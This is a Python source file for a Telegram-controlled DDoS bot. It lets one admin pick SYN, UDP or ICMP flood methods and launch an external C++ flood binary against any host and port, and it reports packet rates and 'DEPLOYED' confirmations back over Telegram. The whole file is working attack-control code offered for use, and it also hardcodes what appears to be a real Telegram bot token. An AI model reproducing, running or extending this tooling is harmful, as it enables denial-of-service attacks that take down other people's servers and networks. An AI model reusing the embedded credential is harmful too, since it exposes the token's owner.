#!/usr/bin/env python3
"""DDOS-Telegram-BOT v4 — C++ backend"""

import os, sys, time, socket, subprocess, threading, signal

import telebot
from telebot import types

TOKEN = os.environ.get("TG_BOT_TOKEN", "8957659231:AAEJznxuaj6RVcw-4DCIw2SBHRKElBLAvBM")
ADMIN_CHAT_ID = int(os.environ.get("TG_ADMIN_ID", "8789271943"))

bot = telebot.TeleBot(TOKEN)
user_attacks = {}

PROCS = {}
STATS = {}
LOCK = threading.Lock()

FLOOD_BIN = os.path.abspath("flood")

ATTACK_METHODS = {
    "1": "SYN Flood (C++)",
    "2": "UDP Flood (C++)",
    "3": "HTTP Slowloris (py)",
    "4": "ICMP Flood (C++)",
    "5": "DNS NXDomain (py)",
    "6": "WebSocket Flood (py)",
}
NAME_TO_ID = {"syn": "1", "udp": "2", "slowloris": "3",
              "icmp": "4", "dns": "5", "ws": "6"}

C_METHODS = {"1": "syn", "2": "udp", "4": "icmp"}


# ─────────────────────────────────────────────────────────────
def is_admin(m):
    return m.from_user.id == ADMIN_CHAT_ID


def is_valid_ip(s):
    try:
        socket.inet_aton(s); return s.count(".") == 3
    except OSError:
        return False


def resolve(target):
    if is_valid_ip(target):
        return target
    return socket.gethostbyname(target)


def launch(method_id, target_ip, target_port, threads, chat_id):
    key = f"{chat_id}:{method_id}:{target_ip}:{target_port}"
    with LOCK:
        if key in PROCS:
            return None, "already running"
        stats_path = f"/tmp/flood_stats_{abs(hash(key))}.txt"

    try:
        if method_id in C_METHODS:
            # C++ binary
            if not os.path.exists(FLOOD_BIN):
                return None, f"binary missing: {FLOOD_BIN}"
            cmd = [FLOOD_BIN, C_METHODS[method_id], target_ip,
                   str(target_port or 80), str(threads), stats_path]
        else:
            return None, "method not implemented in v4 (use syn/udp/icmp)"
    except Exception as e:
        return None, str(e)

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
    except Exception as e:
        return None, f"spawn: {e}"

    with LOCK:
        PROCS[key] = proc
        STATS[key] = stats_path

    return key, None


def stop_key(key):
    with LOCK:
        proc = PROCS.pop(key, None)
        path = STATS.pop(key, None)
    if proc:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
        except Exception:
            pass
    if path and os.path.exists(path):
        try: os.remove(path)
        except Exception: pass
    return proc is not None


def stop_all():
    with LOCK:
        keys = list(PROCS.keys())
    for k in keys: stop_key(k)
    return keys


def read_stats(key):
    path = STATS.get(key)
    if not path or not os.path.exists(path):
        return None
    try:
        with open(path) as f:
            p = f.read().split()
        return int(p[0]), float(p[1])
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
def cmd_start(message):
    if not is_admin(message):
        bot.reply_to(message, "⛔ unauthorized"); return
    markup = types.InlineKeyboardMarkup(row_width=2)
    for num, desc in ATTACK_METHODS.items():
        markup.add(types.InlineKeyboardButton(f"{num}. {desc}",
                                              callback_data=f"attack_{num}"))
    bin_status = "✓" if os.path.exists(FLOOD_BIN) else "✗ MISSING — build flood.cpp"
    bot.send_message(
        message.chat.id,
        f"<b>⚡ v4 (C++ backend)</b>\n"
        f"flood binary: <code>{bin_status}</code>\n\n"
        "<code>/attack &lt;method&gt; &lt;host:port&gt; [threads]</code>\n"
        "methods: syn udp icmp\n\n"
        "/stop &lt;key&gt;  /stopall  /active",
        parse_mode="HTML", reply_markup=markup,
    )


@bot.callback_query_handler(func=lambda c: c.data.startswith("attack_"))
def cb_attack(call):
    if call.from_user.id != ADMIN_CHAT_ID:
        bot.answer_callback_query(call.id, "unauthorized", show_alert=True); return
    mid = call.data.split("_", 1)[1]
    user_attacks[call.message.chat.id] = {"method": mid}
    bot.send_message(call.message.chat.id,
                     f"⛔ {ATTACK_METHODS[mid]} SELECTED\nSend target host:port:")
    bot.answer_callback_query(call.id)


@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    if not is_admin(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "usage: /stop <key>"); return
    bot.reply_to(message, "stopped" if stop_key(parts[1].strip()) else "not found")


@bot.message_handler(commands=["stopall"])
def cmd_stopall(message):
    if not is_admin(message): return
    bot.reply_to(message, f"stopped {len(stop_all())}")


@bot.message_handler(commands=["active"])
def cmd_active(message):
    if not is_admin(message): return
    with LOCK:
        keys = list(PROCS.keys())
    if not keys:
        bot.reply_to(message, "nothing running"); return
    lines = ["<b>Active</b>"]
    now = time.time()
    for k in keys:
        s = read_stats(k)
        if s:
            pkts, start = s
            age = max(0.001, now - start)
            pps = pkts / age
            lines.append(f"<code>{k}</code>\n  pkts={pkts:,}  age={int(age)}s  pps={int(pps):,}")
        else:
            lines.append(f"<code>{k}</code>\n  (no stats)")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["attack"])
def cmd_attack(message):
    if not is_admin(message): return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "usage: /attack <method> <host:port> [threads]")
        return

    method_name = parts[1].lower()
    raw_target = parts[2]
    threads = 8
    if len(parts) >= 4:
        try:
            threads = max(1, min(64, int(parts[3])))
        except ValueError: pass

    mid = NAME_TO_ID.get(method_name)
    if not mid:
        bot.reply_to(message, f"unknown method: {method_name}"); return

    port = None
    target = raw_target
    if ":" in raw_target:
        h, p = raw_target.rsplit(":", 1)
        try: port = int(p); target = h
        except ValueError: pass

    try:
        ip = resolve(target)
    except Exception as e:
        bot.reply_to(message, f"resolve failed: {e}"); return

    label = ATTACK_METHODS[mid]
    tstr = f"{ip}:{port}" if port else ip
    bot.send_message(message.chat.id, f"🚀 {label} → {tstr}  th={threads}")
    key, err = launch(mid, ip, port, threads, message.chat.id)
    if err:
        bot.send_message(message.chat.id, f"error: {err}"); return
    bot.send_message(ADMIN_CHAT_ID, f"☠️ DEPLOYED\n{label}\n{tstr}\nth={threads}\nkey={key}")


@bot.message_handler(func=lambda m: m.chat.id in user_attacks and not m.text.startswith("/"))
def exec_attack(message):
    if not is_admin(message): return
    cid = message.chat.id
    raw = message.text.strip()
    try:
        port = None
        target = raw
        if ":" in raw:
            h, p = raw.rsplit(":", 1)
            try: port = int(p); target = h
            except ValueError: pass
        ip = resolve(target)
        mid = user_attacks[cid]["method"]
        label = ATTACK_METHODS[mid]
        tstr = f"{ip}:{port}" if port else ip
        bot.send_message(cid, f"🚀 {label} → {tstr}")
        key, err = launch(mid, ip, port, 8, cid)
        if err:
            bot.send_message(cid, f"error: {err}"); return
        bot.send_message(ADMIN_CHAT_ID, f"☠️ DEPLOYED\n{label}\n{tstr}\nkey={key}")
    except Exception as e:
        bot.send_message(cid, f"💥 {e}")


# ─────────────────────────────────────────────────────────────
def cleanup(*_):
    print("[*] killing attacks...")
    stop_all()
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)


if __name__ == "__main__":
    if TOKEN in ("PASTE_NEW_TOKEN", "", None):
        print("[!] set TG_BOT_TOKEN"); sys.exit(1)
    if not os.path.exists(FLOOD_BIN):
        print(f"[!] {FLOOD_BIN} missing — build flood.cpp first")
        print(f"    g++ -O3 -march=native -pthread -o flood flood.cpp")
        sys.exit(1)
    if os.geteuid() != 0:
        print("[!] WARNING: not root — attacks will fail")
    print("DDOS-BOT v4 (C++ backend)")
    print(f"binary: {FLOOD_BIN}")
    bot.infinity_polling(timeout=30, long_polling_timeout=25)
